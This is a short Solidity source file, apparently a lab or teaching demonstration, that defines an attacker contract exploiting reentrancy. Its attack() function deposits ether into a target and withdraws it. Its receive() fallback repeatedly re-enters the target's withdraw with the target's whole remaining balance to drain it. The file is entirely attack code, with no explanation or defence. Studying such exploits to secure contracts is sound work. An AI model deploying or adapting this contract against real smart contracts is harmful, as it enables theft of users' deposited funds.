// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackerContract {
    IVulnerableContract public immutable vulnerableContract;
    
    constructor(address _vulnerableAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableAddress);
    }

    receive() external payable {
        uint contractBalance = address(vulnerableContract).balance;
        if (contractBalance > 0) {
            // Withdraw remaining balance instead of fixed amount
            vulnerableContract.withdraw(contractBalance);
        }
    }

    function attack() external payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }
}
